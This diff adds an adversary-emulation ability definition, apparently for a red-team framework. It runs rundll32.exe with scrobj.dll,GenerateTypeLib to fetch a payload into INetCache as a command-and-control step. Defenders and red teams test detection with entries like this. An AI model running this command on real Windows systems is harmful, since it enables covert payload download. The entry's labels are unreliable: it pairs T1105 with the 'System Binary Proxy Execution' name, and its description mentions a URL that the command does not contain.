@@ -1,0 +1,25 @@
+- id: 5953b2ca-d938-0315-2ec8-3fa3e650c7a8
+  name: Scrobj.dll - Once executed, scrobj.dll attempts to load a file from the URL
+    and saves it to INetCache.
+  description: Once executed, scrobj.dll attempts to load a file from the URL and
+    saves it to INetCache.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib payload.exe
+        payloads:
+        - payload.exe
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Eral4m
+  created: '2021-01-07'
+  modified: '2021-01-07'
+  operating_system: Windows All Versions
